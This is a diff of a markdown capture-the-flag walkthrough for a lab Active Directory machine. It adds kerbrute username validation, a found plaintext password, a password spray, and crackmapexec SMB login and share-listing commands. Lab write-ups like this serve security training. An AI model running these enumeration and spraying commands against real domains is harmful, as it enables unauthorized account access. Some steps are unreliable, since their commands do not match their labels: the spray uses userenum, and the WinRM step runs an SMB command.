@@ -170,11 +170,11 @@ Veronica.Patel
 William.Lee
 ```
 
--- 
+---
 
 ## Kerbrute Validate Usernames
 ```CSS
-▶ kerbrute userenum --dc 10.10.10.248 -d intelligence.htb creators.txt
+▶ kerbrute userenum creators.txt --dc 10.10.10.248 -d intelligence.htb
 ```
 ![image](https://user-images.githubusercontent.com/83878909/230821076-266f1262-a0a6-4d35-bd21-025be8a3c845.png)
 
@@ -191,3 +191,37 @@ William.Lee
 ▶ cat *.txt | grep -i password -B5 -A5
 ```
 ![image](https://user-images.githubusercontent.com/83878909/230822841-3abc40df-e706-4d56-8fbe-1c1b6a0fcab9.png)
+  - Password: `NewIntelligenceCorpUser9876`
+
+---
+
+## Kerbrute Password Spray
+```
+▶ kerbrute userenum creators.txt NewIntelligenceCorpUser9876 --dc 10.10.10.248 -d intelligence.htb -v
+```
+![image](https://user-images.githubusercontent.com/83878909/230831769-4dfc3fc7-a2ab-4be5-a034-bbb67725fe2b.png)
+
+---
+
+## Attempt Logins
+  - SMB Login: Failed
+```CSS
+▶ crackmapexec smb 10.10.10.248 -u Tiffany.Molina -p NewIntelligenceCorpUser9876
+```
+![image](https://user-images.githubusercontent.com/83878909/230832417-7e22c44a-e4b7-4c57-8074-1f134362893b.png)
+
+  - Winrm Login: Failed
+```CSS
+▶ crackmapexec smb 10.10.10.248 -u Tiffany.Molina -p NewIntelligenceCorpUser9876 --shares
+```
+![image](https://user-images.githubusercontent.com/83878909/230832825-500c2c4c-c5bc-408f-9054-ff525fc9189e.png)
+
+---
+
+## SMB Shares
+  - List SMB Shares
+```CSS
+▶ crackmapexec smb 10.10.10.248 -u Tiffany.Molina -p NewIntelligenceCorpUser9876 --shares
+```
+![image](https://user-images.githubusercontent.com/83878909/230832582-d9290c11-90a7-4a0d-bd7a-fafde4a67b18.png)
+
